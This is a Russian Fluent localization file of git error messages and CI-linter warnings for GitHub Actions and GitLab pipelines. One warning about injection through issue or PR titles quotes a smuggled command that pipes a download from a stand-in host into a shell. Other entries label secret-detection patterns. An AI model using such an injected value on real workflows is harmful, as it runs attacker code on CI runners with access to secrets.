# Семантические ключи Fluent. Сообщения классификатора git совпадают со словарём 1.x (проверяется тестом).

error-protected = Ветка защищена на сервере — прямой push запрещён
error-protected-hint = Создайте отдельную ветку и откройте Pull Request, либо попросите администратора изменить правила защиты.

error-hook-declined = Сервер отклонил push (серверный хук)
error-hook-declined-hint = Посмотрите подробности: сервер обычно сообщает причину в строках, начинающихся с «remote:».

error-forbidden = Нет прав на запись в этот репозиторий
error-forbidden-hint = Ваш аккаунт или токен имеет только права на чтение. Попросите доступ Write у владельца репозитория или используйте токен со scope «repo».

error-host-key = SSH: ключ сервера не подтверждён
error-host-key-hint = Один раз подключитесь из терминала (например, «ssh -T git@github.com») и подтвердите отпечаток сервера.

error-auth = Ошибка авторизации на сервере
error-auth-hint = Введите логин и пароль, токен доступа или выберите SSH-ключ в окне «Авторизация репозитория» — программа запомнит их для этого репозитория. Для HTTPS также подойдёт окно Git Credential Manager; для SSH — ключ, добавленный в аккаунт на сервере.

error-not-found = Репозиторий не найден или к нему нет доступа
error-not-found-hint = Проверьте URL remote. Для приватных репозиториев сервер отвечает «not found», если у аккаунта нет доступа.

error-rejected-non-ff = Remote-ветка содержит коммиты, которых нет у вас
error-rejected-non-ff-hint = Сначала сделайте Pull, либо Force Push (with lease), если уверены, что хотите перезаписать remote.

error-diverged = Ветки разошлись — fast-forward невозможен
error-diverged-hint = Используйте Pull (fast-forward if possible) или Pull (rebase).

error-conflict = Возникли конфликты слияния
error-conflict-hint = Разрешите конфликты в отмеченных файлах, затем застейджите их и сделайте коммит.

error-dirty = Локальные изменения мешают операции
error-dirty-hint = Закоммитьте изменения или сделайте Stash, затем повторите.

error-network = Не удалось связаться с сервером
error-network-hint = Проверьте подключение к интернету, VPN или прокси.

# Сообщения Rust (crates/*/src). { $a0 }, { $a1 }… — аргументы t()/tr!() по порядку.

## crates/gorynych-ci-linter/src/check/base.rs

perhaps-you-meant = {" "}Возможно, имелось в виду { $a0 }.
must-be-followed-by-variable = после $ должно идти имя переменной (позиция { $a0 })
unclosed-quote-position = не закрыта кавычка { $a0 } (позиция { $a1 })
unclosed-regex-position = не закрыта регулярка /…/ (позиция { $a0 })
invalid-regex = неверная регулярка /{ $a0 }/: { $a1 }
single-position-comparison-needs = одиночный «=» (позиция { $a0 }) — для сравнения нужен «==»
without-quotes-position-strings-in = { $a0 } без кавычек (позиция { $a1 }) — строки в выражениях пишутся в кавычках: "{ $a2 }"
unexpected-character-position = непонятный символ { $a0 } (позиция { $a1 })
empty-expression = пустое выражение
extra-text-after-expression-missing = лишнее после выражения: { $a0 } — не хватает && или ||?
expression-is-cut-off = выражение обрывается
unclosed-parenthesis = не закрыта скобка (
expected-value-but-found = ожидалось значение, а встретилось { $a0 }
quoted-string = строка в кавычках
value = значение
right-side-of-must-be = справа от { $a0 } должна быть регулярка /…/, а не { $a1 }
gitlab-token-glpat = токен GitLab (glpat-…)
github-token-ghp = токен GitHub (ghp_…)
github-token-github-pat = токен GitHub (github_pat_…)
aws-access-key-akia = ключ доступа AWS (AKIA…)
slack-token = токен Slack
private-key = приватный ключ
google-api-key = ключ Google API
stripe-secret-key = секретный ключ Stripe

## crates/gorynych-ci-linter/src/check/github.rs

september-2021 = сентябрь 2021
april-2023 = апрель 2023
april-2025 = апрель 2025
august-2022 = август 2022
june-2024 = июнь 2024
december-2024 = декабрь 2024
december-2025 = декабрь 2025
march-2022 = март 2022
june-2025 = июнь 2025
job-will-fail-right-away = Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/upload-artifact: v3`».
job-will-fail-right-away-this = Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/download-artifact: v3`».
job-will-fail-since-february = Задание упадёт: с февраля 2025 старые версии actions/cache отключены (сервис кэша v1 выключен).
works-with-warning-node-js = Работает с предупреждением «Node.js 16/20 actions are deprecated» и может перестать запускаться, когда GitHub отключит старый Node.js.
works-with-deprecated-node-js = Работает с предупреждением об устаревшем Node.js, позже может перестать запускаться.
works-with-deprecated-node-js-warning = Работает с предупреждением об устаревшем Node.js.
github-wont-run-workflow-invalid = GitHub не запустит workflow: «Invalid workflow file … { $a0 }». На вкладке Actions будет красная ошибка с этим текстом.
n-5-fields-are-needed = нужно 5 полей (минуты часы день месяц день_недели), а здесь { $a0 }
minutes = минуты
hours = часы
day-of-month = день месяца
month = месяц
day-of-week = день недели
field-unrecognized-value = поле «{ $a0 }»: непонятное значение { $a1 }
field-is-out-of-range = поле «{ $a0 }»: { $a1 } вне диапазона { $a2 }–{ $a3 }
field-step-0 = поле «{ $a0 }»: шаг /0
as-string-only-read-all = Строкой можно указать только read-all или write-all.
on-every-run = При каждом запуске
github-token-will-get-write = Токен GITHUB_TOKEN получит право записи во всё — если какой-то шаг (стороннее действие) скомпрометирован, он сможет менять код и релизы.
broad-permissions-without-need = Широкие права без необходимости.
list-only-needed-permissions-contents = Перечислите только нужные права: contents: read, pull-requests: write…
permissions-unknown-permission = permissions: неизвестное право { $a0 }
permissions = Права: { $a0 }.{ $a1 }
fix-permission-name = Исправьте имя права.
id-token-allows-only-write = id-token допускает только write или none.
value-is-read-write-or = Значение — read, write или none.
move-secret-to-env-and = Перенесите секрет в env и проверяйте env.MY_SECRET != ''
at-step-level = {" "}на уровне шага
secrets-in-if-condition = { $a0 }: secrets в условии if
secrets-context-isnt-available-in = Контекст secrets недоступен в if (чтобы условие не раскрывало секрет).
condition-is-always-true = { $a0 }: условие { $a1 } всегда истинно
step-job-will-always-run = Шаг/задание выполнится всегда: после ${"{"}{"{"} … {"}"}{"}"} идёт текст, и всё выражение становится непустой строкой.
if-doesnt-cover-whole-condition = Если ${"{"}{"{"} {"}"}{"}"} занимает не всё условие, GitHub подставляет результат в строку, а непустая строка — истина.
remove-or-wrap-whole-condition = Уберите ${"{"}{"{"} {"}"}{"}"} или оберните им всё условие: if: ${"{"}{"{"} { $a0 } { $a1 } {"}"}{"}"}
right-on-push-github-checks = Сразу при push — GitHub проверяет файл workflow до запуска
unknown-section = Неизвестный раздел { $a0 }
allowed-at-top-level = На верхнем уровне допустимы: { $a0 }.{ $a1 }
fix-or-delete-section = Исправьте или удалите раздел.
when-to-run-isnt-specified = Не указано, когда запускать (on)
without-on-github-doesnt-know = Без on GitHub не знает, на какие события реагировать.
no-jobs-section = Нет раздела jobs
workflow-without-jobs-does-nothing = Workflow без заданий ничего не делает.
unknown-event = Неизвестное событие { $a0 }
github-doesnt-know-this-event = GitHub не знает такого события.{ $a0 }
fix-event-name = Исправьте имя события.
unknown-filter = { $a0 }: неизвестный фильтр { $a1 }
allowed = Допустимы: { $a0 }.{ $a1 }
fix-key = Исправьте ключ.
and-together = { $a0 }: { $a1 } и { $a2 } вместе
you-cant-include-and-exclude = Нельзя одновременно включать и исключать в одном событии.
keep-and-add-exclusions-with = Оставьте { $a0 } и добавьте исключения через «!»: - '!release/**'
more-than-25-inputs = { $a0 }: больше 25 параметров
github-limit = Ограничение GitHub.
combine-inputs-for-example-json = Объедините параметры (например, JSON в одной строке).
input-type = Параметр { $a0 }: тип { $a1 }
allowed-types = Допустимые типы: { $a0 }.{ $a1 }
input-choice-without-options = Параметр { $a0 }: choice без options
picking-from-list-needs-list = Для выбора из списка нужен сам список.
input-default-isnt-in-options = Параметр { $a0 }: default не из options
set-default-to-value-from = Укажите default из списка.
input-default-for-boolean = Параметр { $a0 }: default { $a1 } для boolean
default-value-will-be-treated = Значение по умолчанию будет восприниматься как строка; сравнение inputs.x == true может не сработать.
boolean-expects-true-false-without = Для boolean ожидается true/false без кавычек.
schedule-without-cron = schedule без cron
schedule-is-required = Нужно расписание.
schedule-entry-without-cron = schedule: запись без cron
each-schedule-entry-is-cron = Каждая запись schedule — {"{"} cron: "…" {"}"}.
invalid-schedule = Неверное расписание { $a0 }
for-example-30-2-1 = Например '30 2 * * 1-5' — по будням в 02:30 UTC.
schedule-more-often-than-every = Расписание { $a0 } — чаще раза в 5 минут
on-schedule = По расписанию
github-will-still-run-it = GitHub всё равно будет запускать не чаще раза в 5 минут, а в часы нагрузки — с задержкой или с пропусками.
minimum-schedule-interval-in-actions = Минимальный интервал расписаний в Actions — 5 минут.
use-5-or-less-often = Используйте '*/5 * * * *' или реже.
schedule-in-utc = Расписание { $a0 } — по UTC
it-will-run-on-utc = Запуск будет по времени UTC, а не по вашему часовому поясу; в неактивных репозиториях (60 дней без коммитов) расписания отключаются.
thats-how-schedules-work-in = Так устроены расписания в GitHub Actions.
convert-time-to-utc-moscow = Переведите время в UTC (Москва = UTC+3).
unclosed-expression = Не закрыто выражение ${"{"}{"{"} … {"}"}{"}"}
has-no-closing = В { $a0 } нет закрывающих «{"}"}{"}"}».
add = Добавьте «{"}"}{"}"}».
invalid-job-id = Недопустимый id задания { $a0 }
job-id-is-latin-letters = id задания — латиница, цифры, «_» и «-», начинается с буквы или «_».
rename-it-to-set-human = Переименуйте в { $a0 }; человекочитаемое имя задайте через name:.
job-must-be-map = { $a0 }: задание должно быть картой
job-is-described-by-keys = Задание описывается ключами runs-on, steps…
commands-are-written-in-steps = {" "}Команды пишутся в steps: - run: …
unknown-key = { $a0 }: неизвестный ключ { $a1 }
allowed-2 = Допустимы: { $a0 }.{ $a1 }{ $a2 }
needs-on-unknown = { $a0 }: needs на неизвестное { $a1 }
theres-no-job-with-id = Задания с id { $a0 } нет (needs ссылается на id, а не на name).{ $a1 }
fix-id = Исправьте id.
uses-together-with-runs-on = { $a0 }: uses вместе с runs-on/steps
job-that-calls-reusable-workflow = Задание, вызывающее переиспользуемый workflow (uses), не может иметь своих шагов.
keep-uses-with-secrets-or = Оставьте uses + with/secrets или runs-on + steps.
no-file = { $a0 }: нет файла { $a1 }
file-isnt-in-repository = Файла нет в репозитории.
check-path-github-workflows-yml = Проверьте путь (.github/workflows/…yml).
uses-without-version = { $a0 }: uses без @версии
workflow-from-another-repository-needs = Для workflow из другого репозитория нужна версия: owner/repo/.github/workflows/x.yml@v1.
runs-on-isnt-specified = { $a0 }: не указан runs-on
job-must-know-which-machine = Задание должно знать, на какой машине выполняться.
when-job-runs = При запуске задания { $a0 }
when-job-runs-2 = При выполнении задания { $a0 }
runner-no-longer-exists = { $a0 }: раннер { $a1 } больше не существует
job-wont-start-this-request = Задание не начнётся: «This request was automatically failed because there were no enabled runners online to process the request…» (образ { $a0 } отключён — { $a1 }).
github-removes-old-runner-images = GitHub удаляет старые образы раннеров.
runs-on-or-latest = runs-on: { $a0 } (или { $a1 }-latest)
container-on = { $a0 }: container на { $a1 }
job-will-fail-on-first = Задание упадёт на первом шаге: «Container operations are only supported on Linux runners».
containers-in-actions-work-only = Контейнеры в Actions работают только на Linux.
timeout-minutes-more-than-6 = { $a0 }: timeout-minutes { $a1 } — больше 6 часов
on-github-runners-job-will = На раннерах GitHub задание всё равно будет остановлено через 6 часов.
github-hosted-runner-limit-is = Лимит GitHub-hosted раннеров — 360 минут.
split-work-into-parts-or = Разбейте работу на части или используйте свой раннер.
matrix-produces-jobs = { $a0 }: матрица даёт { $a1 } заданий
at-most-256-combinations = Не более 256 комбинаций.
reduce-matrix-values = Сократите значения матрицы.
no-steps = { $a0 }: нет steps
job-has-nothing-to-run = Заданию нечего выполнять.
steps-is-empty-or-not = { $a0 }: steps пуст или не список
steps-is-list-of-steps = steps — список шагов, каждый начинается с «- ».
job = задании { $a0 }
step = шаг { $a0 }
isnt-map = { $a0 }: { $a1 } — не карта
step-is-set-of-keys = Шаг — набор ключей (uses / run / name…).
unknown-key-2 = { $a0 }: { $a1 } — неизвестный ключ { $a2 }
has-both-uses-and-run = { $a0 }: { $a1 } — и uses, и run
step-either-calls-action-or = Шаг либо вызывает действие, либо выполняет команды.
split-it-into-two-steps = Разделите на два шага.
has-neither-uses-nor-run = { $a0 }: { $a1 } — нет ни uses, ни run
step-has-nothing-to-do = Шагу нечего делать.
pull-request-target-checkout-of = { $a0 }: pull_request_target + checkout кода из PR
on-pull-request-from-fork = При pull request из форка
code-from-someone-elses-pr = Код из чужого PR выполнится с доступом к секретам и токену с правом записи — классическая атака «pwn request».
pull-request-target-runs-in = pull_request_target работает в контексте основного репозитория (с секретами), а checkout берёт непроверенный код PR.
use-pull-request-or-dont = Используйте pull_request, или не запускайте код из PR в этом workflow.
local-action-before-checkout = { $a0 }: локальное действие { $a1 } до checkout
step-will-fail-cant-find = Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{ $a0 }'. Did you forget to run actions/checkout before running your local action?»
repository-files-appear-on-runner = Файлы репозитория появляются на раннере только после actions/checkout.
put-uses-actions-checkout-v5 = Поставьте - uses: actions/checkout@v5 раньше этого шага.
no-action = { $a0 }: нет действия { $a1 }
step-will-fail-cant-find-action = Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/{ $a0 }'».
has-no-action-yml = В { $a0 } нет action.yml.
check-path = Проверьте путь.
without-version = { $a0 }: { $a1 } без @версии
action-from-another-repository-needs = Для действия из другого репозитория нужна версия (тег, ветка или SHA).
v1-better-full-commit-sha = { $a0 }@v1 (лучше — полный SHA коммита)
is-deprecated = { $a0 }: { $a1 } устарело
versions-of-before-are-disabled = Версии { $a0 } до { $a1 } отключены или переведены в устаревшие.
by-branch = { $a0 }: { $a1 } — по ветке
action-can-change-at-any = Действие может измениться в любой момент — и сломать сборку или выполнить чужой код с вашими секретами.
branch-reference-to-third-party = Ссылка на ветку стороннего репозитория не фиксирует версию.
specify-tag-or-full-commit = Укажите тег или полный SHA коммита.
set-output-is-deprecated = { $a0 }: { $a1 } — ::set-output устарел
it-now-shows-warning-set = Сейчас выдаёт предупреждение «The `set-output` command is deprecated», после отключения значение не попадёт в outputs.
set-output-save-state-commands = Команды ::set-output / ::save-state заменены файлами окружения.
set-env-add-path-are = { $a0 }: { $a1 } — ::set-env / ::add-path отключены
step-will-fail-set-env = Шаг упадёт: «The `set-env` command is disabled. Please upgrade to using Environment Files».
commands-were-disabled-for-security = Команды отключены по соображениям безопасности.
right-in-command = { $a0 }: { $a1 } — { $a2 } прямо в команде
when-issue-pr-author-is = Когда автор issue/PR — посторонний
text-from-title-description-is = Текст из заголовка/описания подставится в скрипт как есть: заголовок вида «"; curl evil.sh | sh #» выполнится на раннере.
expressions-are-substituted-before-shell = Выражения ${"{"}{"{"} {"}"}{"}"} подставляются до запуска shell, без экранирования.
step-2 = шага { $a0 }{ $a1 }
steps-no-step-with-this = { $a0 }: steps.{ $a1 } — нет шага с таким id
expression-will-give-empty-string = Выражение даст пустую строку — условие или параметр будут не тем, что ожидается.
job-has-no-step-with = В задании нет шага с id: { $a0 }.{ $a1 }
add-id-to-right-step = Добавьте id: { $a0 } нужному шагу.
job-has-no-strategy-matrix = У задания нет strategy.matrix.
matrix-has = В матрице есть: { $a0 }.
matrix-no-such-dimension = { $a0 }: matrix.{ $a1 } — такого измерения нет
empty-string-will-be-substituted = Подставится пустая строка.
fix-name-or-add-it = Исправьте имя или добавьте его в матрицу.
needs-outputs-without-needs = { $a0 }: needs.{ $a1 }.outputs без needs: { $a2 }
value-will-be-empty-jobs = Значение будет пустым: результаты задания доступны только тем, кто его ждёт.
isnt-listed-in-needs-of = { $a0 } не указано в needs задания { $a1 }.
has-no-output = { $a0 }: у { $a1 } нет output { $a2 }
outputs-of-job = outputs задания { $a0 }: { $a1 }.
fix-name-or-declare-output = Исправьте имя или объявите output.
no-actions-checkout-before = { $a0 }: нет actions/checkout до { $a1 }
command-will-fail-clean-runner = Команда упадёт: на чистом раннере нет файлов репозитория — «No such file or directory», «npm ERR! enoent Could not read package.json».
repository-code-appears-on-runner = Код репозитория появляется на раннере только после шага actions/checkout.
as-first-step-uses-actions =
    Первым шагом:
    - uses: actions/checkout@v5
step-of-job-has-in = В шаге задания { $a0 } открытым текстом { $a1 }
right-now-file-is-in = Уже сейчас — файл в истории Git
everyone-with-access-to-repository = Ключ увидят все, у кого есть доступ к репозиторию.
secrets-must-be-stored-in = Секреты нужно хранить в Settings → Secrets.
revoke-key-and-use-secrets = Отзовите ключ и используйте ${"{"}{"{"} secrets.ИМЯ {"}"}{"}"}.
jobs-wait-for-each-other = Задания ждут друг друга по кругу: { $a0 }
none-of-jobs-can-start = Ни одно из заданий не может начаться первым.
remove-one-of-dependencies = Уберите одну из зависимостей.

## crates/gorynych-ci-linter/src/check/gitlab/catalog.rs

coverage-report-coverage-format = coverage_report: {"{"} coverage_format: cobertura, path: … {"}"} (cobertura удалён в GitLab 15.0)
browser-performance-performance-removed = browser_performance (performance удалён в GitLab 15.0)
cyclonedx-license-scanning-removed-in = cyclonedx / сканирование лицензий (удалено в GitLab 16.0)

## crates/gorynych-ci-linter/src/check/gitlab/extends.rs

extends-must-be-name-or = { $a0 }: extends должен быть именем или списком имён
extends-names-template-jobs = extends указывает имена заданий-шаблонов.
extends-template-or-extends-b = extends: .template или extends: [.a, .b]
it-may-be-in-network = {" "}(Возможно, он в подключении из сети — тогда всё в порядке.)
extends-refers-to-nonexistent = { $a0 }: extends ссылается на несуществующее { $a1 }
job-or-template-isnt-in = Задания или шаблона { $a0 } нет ни в этом файле, ни в подключённых локальных.{ $a1 }{ $a2 }
fix-name-or-add-template = Поправьте имя или добавьте шаблон.
circular-inheritance = Циклическое наследование: { $a0 }
jobs-inherit-from-each-other = Задания наследуют друг друга по кругу — итоговую конфигурацию собрать невозможно.
break-cycle-move-shared-part = Разорвите цикл: вынесите общее в отдельный шаблон.
inheritance-too-deep = { $a0 }: слишком глубокое наследование ({ $a1 })
gitlab-allows-at-most-11 = GitLab допускает не более 11 уровней extends.
simplify-template-chain = Упростите цепочку шаблонов.
has-no-key = У { $a0 } нет ключа { $a1 }.
theres-no-job = Задания { $a0 } нет.{ $a1 }
reference-doesnt-exist = !reference [{ $a0 }] — такого нет
fix-job-key-name-in = Поправьте имя задания/ключа в !reference.
template-isnt-used-anywhere = Шаблон { $a0 } нигде не используется
nothing-will-break-it-just = Ничего не сломается — он просто не участвует в пайплайне.
no-job-inherits-it-via = Ни одно задание не наследует его через extends и не ссылается через !reference.
delete-template-or-use-it = Удалите шаблон или подключите его через extends.
stage-declared-twice = Этап объявлен дважды: { $a0 }
gitlab-keeps-only-first-mention = GitLab оставит только первое упоминание; порядок этапов может оказаться не тем, что ожидается.
each-stage-must-appear-in = Каждый этап должен встречаться в stages один раз.
remove-repeat = Удалите повтор.
pre-and-post-dont-need = {"."}pre и .post в stages указывать не нужно
nothing-will-break-these-stages = Ничего не сломается: эти этапы есть всегда и всегда идут первым и последним.
their-position-is-fixed-listed = Их позиция фиксирована, указанный порядок игнорируется.
remove-pre-post-from-stages = Уберите .pre / .post из stages.

## crates/gorynych-ci-linter/src/check/gitlab/jobs.rs

job-name-too-long = Слишком длинное имя задания
job-name-is-limited-to = Имя задания ограничено 255 символами.
shorten-name = Сократите имя.
typo-in = {" "}— опечатка в { $a0 }?
gitlab-doesnt-know-key-closest = GitLab не знает ключа { $a0 }; ближайший допустимый — { $a1 }.
gitlab-checks-all-job-keys = GitLab проверяет все ключи задания; { $a0 } среди них нет.{ $a1 }
key-came-from-template-in = {" "}Ключ пришёл из шаблона в extends.
rename-to = Переименуйте { $a0 } в { $a1 }.
remove-key-or-move-data = Удалите ключ или вынесите данные в variables.
unknown-key-3 = { $a0 }: неизвестный ключ { $a1 }{ $a2 }
typo-in-2 = { $a0 } — опечатка в { $a1 }?
no-script = { $a0 }: нет script
section-isnt-reserved-so-gitlab = Раздел { $a0 } не служебный, поэтому GitLab считает его заданием, а у задания нет script.
job-has-no-commands-to = У задания нет команд для выполнения{ $a0 }.
and-templates-in-extends-dont = {" "}— и шаблоны в extends их не добавляют
rename-to-2 = Переименуйте в { $a0 }.
add-script-for-example-script =
    Добавьте script, например:
    { $a0 }:
    {"  "}script:
    {"    "}- echo "…"
trigger-and-script-together = { $a0 }: trigger и script одновременно
job-with-trigger-doesnt-run = Задание с trigger само ничего не выполняет — оно запускает другой пайплайн.
split-it-into-two-jobs = Разделите на два задания: одно со script, другое с trigger.
empty-script = { $a0 }: пустой script
script-must-have-at-least = В script должна быть хотя бы одна команда.
add-command-or-delete-job = Добавьте команду или удалите задание.
line-was-read-as-key = { $a0 }: строка { $a1 } прочитана как «ключ: значение»
line-contains-yaml-treats-it = В строке { $a0 } есть «: » — YAML считает это картой, а не командой.
quote-line = Возьмите строку в кавычки: - '{ $a0 }: { $a1 }'
in-value-is = { $a0 }: в { $a1 } значение { $a2 }
command-will-run-most-likely = Выполнится команда { $a0 } — скорее всего «command not found».
yaml-read-string-as-number = YAML прочитал строку как число/логическое значение.
check-string-and-quote-it = Проверьте строку и возьмите её в кавычки.
stage-must-be-string = { $a0 }: stage должен быть строкой
job-belongs-to-one-stage = Задание относится к одному этапу.
stages-isnt-declared-so-only = stages не объявлен, поэтому доступны только build, test, deploy (+ .pre, .post).{ $a0 }
perhaps = {" "}Возможно, { $a0 }.
declared-stages = Объявлены этапы: { $a0 }.{ $a1 }
change-it-to-stage-or = Исправьте на stage: { $a0 } или добавьте { $a1 } в stages.
add-to-stages = Добавьте { $a0 } в stages.
stage-isnt-in-stages = { $a0 }: этапа { $a1 } нет в stages
unknown-value = Неизвестное значение.{ $a0 }
use-one-of = Используйте одно из: { $a0 }.
when-never-job-will-never = { $a0 }: when: never — задание никогда не запустится
job-wont-be-in-any = Задания не будет ни в одном пайплайне.
when-never-at-job-level = when: never на уровне задания отключает его полностью (обычно never пишут внутри rules).
delete-job-or-move-condition = Удалите задание или перенесите условие в rules.
when-delayed-without-start-in = { $a0 }: when: delayed без start_in
delayed-job-needs-to-know = Отложенному заданию нужно знать, через сколько стартовать.
start-in-without-when-delayed = { $a0 }: start_in без when: delayed
start-in-only-makes-sense = start_in имеет смысл только для отложенных заданий.
add-when-delayed-or-remove = Добавьте when: delayed или уберите start_in.
cant-parse-start-in = { $a0 }: не разобрать start_in: { $a1 }
duration-is-written-as-30 = Длительность пишется как «30 minutes», «1 hour», «2 days».
start-in-is-longer-than = { $a0 }: start_in больше недели
maximum-delay-is-1-week = Максимальная задержка — 1 неделя.
reduce-start-in-or-use = Уменьшите start_in или используйте расписание.
came-from-template = {" "}({ $a0 } пришёл из шаблона)
rules-together-with = { $a0 }: rules вместе с { $a1 }
rules-replaces-they-cant-be = rules заменяет { $a0 }; вместе их использовать нельзя{ $a1 }.
move-condition-from-to-rules = Перенесите условие из { $a0 } в rules.
more-than-50-needs = { $a0 }: needs больше 50
gitlab-limit = Ограничение GitLab.
shorten-list-or-merge-jobs = Сократите список или объедините задания.
dependencies-on-nonexistent = { $a0 }: dependencies на несуществующее { $a1 }
fix-name = Поправьте имя.
in-dependencies-but-not-in = { $a0 }: { $a1 } в dependencies, но не в needs
when-needs-is-set-dependencies = Когда задан needs, dependencies может ссылаться только на задания из needs.
add-to-needs = Добавьте { $a0 } в needs.
isnt-from-previous-stage = { $a0 }: { $a1 } не из предыдущего этапа
artifacts-can-only-be-taken = Артефакты можно брать только у заданий из предыдущих этапов, а { $a0 } — в этапе { $a1 }.
move-job-or-use-needs = Перенесите задание или используйте needs.
service-has-no-name = { $a0 }: у сервиса нет name
service-is-docker-image = Сервис — это образ Docker.
service = сервис
invalid-service-alias = { $a0 }: недопустимый alias сервиса { $a1 }
job-will-fail-when-starting = Задание упадёт при запуске сервиса: имя хоста недопустимо.
alias-becomes-host-name-only = alias становится именем хоста: только буквы, цифры, точка, дефис.
for-example-alias-db = Например alias: db
needs-entry-without-job = { $a0 }: в needs запись без job
each-needs-entry-is-job = Каждая запись needs — имя задания или {"{"} job: имя {"}"}.
depends-on-itself = { $a0 } зависит само от себя
job-cant-wait-for-itself = Задание не может ждать завершения самого себя.
remove-job-itself-from-needs = Уберите себя из needs.
is-hidden-job-template-it = { $a0 } — скрытое задание (шаблон), оно не выполняется и не может быть в needs.
needs-on-nonexistent = { $a0 }: needs на несуществующее { $a1 }
fix-name-or-add-optional = Исправьте имя или добавьте optional: true.
waits-for-from-later-stage = { $a0 } ждёт { $a1 } из более позднего этапа
is-in-stage-which-comes = { $a0 } в этапе { $a1 }, который идёт после { $a2 }.
move-to-stage-no-earlier = Перенесите { $a0 } в этап не раньше { $a1 } или { $a2 } — раньше.
needs-unknown-key = { $a0 }: needs — неизвестный ключ { $a1 }
allowed-job-artifacts-optional-pipeline = Допустимы: job, artifacts, optional, pipeline, project, ref, parallel.{ $a0 }
remove-key = Уберите ключ.
parallel-is-integer-from-1 = parallel — целое число от 1 до 200.
parallel-matrix-entry-isnt-map = { $a0 }: запись parallel:matrix не карта
each-matrix-entry-is-set = Каждая запись матрицы — набор «ПЕРЕМЕННАЯ: [значения]».
nested-structure-in-matrix = { $a0 }: в матрице { $a1 } — вложенная структура
matrix-values-are-strings-or = Значения матрицы — строки или числа.
list-values-as-list-of = Перечислите значения списком строк.
at-most-200-combinations-per = Не более 200 комбинаций на задание.
reduce-number-of-values = Сократите число значений.
unrecognized-parallel = { $a0 }: непонятный parallel
parallel-is-number-or-matrix = parallel — число или {"{"} matrix: [...] {"}"}.
gitlab-retries-job-at-most = GitLab повторяет задание не более 2 раз.
unknown-retry-reason = Неизвестная причина повтора.{ $a0 }
allowed-3 = Допустимы: { $a0 }…
retry-unknown-key = { $a0 }: retry — неизвестный ключ { $a1 }
allowed-max-when-exit-codes = Допустимы max, when, exit_codes.
cant-parse-timeout = { $a0 }: не разобрать timeout: { $a1 }
duration-is-written-as-1h = Длительность пишется как «1h 30m», «90 minutes».
timeout-longer-than-month = { $a0 }: timeout больше месяца
maximum-is-1-month = Максимум — 1 месяц.
reduce-timeout = Уменьшите timeout.
allow-failure-is-true-false = allow_failure — true/false или {"{"} exit_codes: [коды] {"}"}.
coverage-isnt-regular-expression = { $a0 }: coverage не регулярное выражение
coverage-is-written-between-slashes = coverage пишется между слэшами.
error-in-coverage-regex = { $a0 }: ошибка в регулярке coverage
fix-expression = Исправьте выражение.
interruptible-must-be-true-false = { $a0 }: interruptible должен быть true/false
currently = Сейчас: { $a0 }.
tags-must-be-list-of = { $a0 }: tags должен быть списком строк
tags-are-given-as-list = Теги перечисляются списком.
inherit-unknown-key = { $a0 }: inherit — неизвестный ключ { $a1 }
allowed-default-and-variables = Допустимы default и variables.
inherit-must-be-map = { $a0 }: inherit должен быть картой
trigger-with-both-project-and = { $a0 }: trigger с project и include одновременно
either-child-pipeline-include-or = Либо дочерний пайплайн (include), либо пайплайн другого проекта (project).
keep-one = Оставьте одно.
allowed-depend-and-mirror = Допустимы depend и mirror.
child-pipeline-not-found = { $a0 }: дочерний пайплайн { $a1 } не найден
when-job-gets-its-turn = Когда дойдёт очередь до задания { $a0 }
child-pipeline-wont-be-created = Дочерний пайплайн не создастся, задание { $a0 } упадёт: «Included file `{ $a1 }` is empty or does not exist!».
check-path-from-repository-root = Проверьте путь от корня репозитория.
folder-isnt-in-artifacts = { $a0 }: в артефактах нет папки { $a1 }
after-job = После задания { $a0 }
site-wont-be-published-pages = Сайт не опубликуется: задание pages:deploy упадёт — «pages:deploy … The { $a0 } folder is missing from the artifacts».
gitlab-pages-publishes-contents-of = GitLab Pages публикует содержимое папки { $a0 } из артефактов задания.
release-without-tag-name = { $a0 }: release без tag_name
release-is-tied-to-tag = Релиз привязан к тегу.
release-without-description = { $a0 }: release без description
release-description-is-required = Описание релиза обязательно.
description-release-ci-commit-tag = description: "Релиз $CI_COMMIT_TAG"
release-in-image-without-release = { $a0 }: release в образе без release-cli
job-will-fail-release-cli = Задание упадёт: «release-cli: command not found» (или «glab: not found»).
release-key-is-run-by = Ключ release выполняется утилитой release-cli / glab, которой нет в обычных образах.
stage-is-declared-but-has = Этап { $a0 } объявлен, но в нём нет заданий
nothing-will-break-empty-stage = Ничего не сломается — пустой этап просто не показывается.
no-job-specifies-stage = Ни одно задание не указывает stage:{" "}
remove-stage-or-check-jobs = Уберите этап или проверьте stage у заданий (опечатка?).
only-except-are-deprecated-set = only/except устарели ({ $a0 } задан.)
it-works-for-now-but = Сейчас работает, но новые возможности (needs, variables, changes:compare_to в правилах) доступны только через rules.
only-except-are-no-longer = only/except больше не развиваются. Используются в: { $a0 }{ $a1 }.
for-example-only-main-rules =
    Например, only: [main] →
    rules:
    {"  "}- if: $CI_COMMIT_BRANCH == "main"
needs-runner-with-tags = Нужен раннер с тегами: { $a0 }
when-jobs-run = При запуске заданий { $a0 }{ $a1 }
if-theres-no-such-runner = Если такого раннера нет, задание повиснет в pending: «This job is stuck because you don’t have any active runners online … with any of these tags assigned to them».
job-is-picked-up-only = Задание берёт только раннер, у которого есть все перечисленные теги.
check-settings-ci-cd-runners = Проверьте Settings → CI/CD → Runners.
docker-dind-requires-privileged-runner = docker:dind требует privileged-раннер
on-runner-without-privileged-true = На раннере без privileged = true сервис не стартует: «mount: permission denied» / «Cannot connect to the Docker daemon».
docker-in-docker-runs-its = Docker-in-Docker запускает свой демон внутри контейнера, а это нужно разрешить в настройках раннера.
check-that-runner-has-privileged = Проверьте, что у раннера privileged = true (config.toml), или используйте kaniko/buildah.
none-of-jobs-can-start-first = Ни одно из заданий не может стартовать первым.

## crates/gorynych-ci-linter/src/check/gitlab/mod.rs

right-on-push-gitlab-checks = Сразу при push — GitLab проверяет весь файл ещё до создания пайплайна
gitlab-wont-create-pipeline-and = GitLab не создаст пайплайн и покажет ошибку: «{ $a0 }». Ни одно задание не запустится.
at-top-level = на верхнем уровне
in = в { $a0 }
there-will-be-no-error = Ошибки не будет: YAML молча возьмёт последнее значение, а первое (строка{" "}
is-lost-entirely = ) будет потеряно целиком.
key-is-repeated = Ключ { $a0 } повторяется { $a1 }
key-may-appear-only-once = В одном блоке YAML ключ может встречаться только один раз; повтор обычно — результат копирования.
remove-extra-block-or-merge = Удалите лишний блок или объедините их в один.
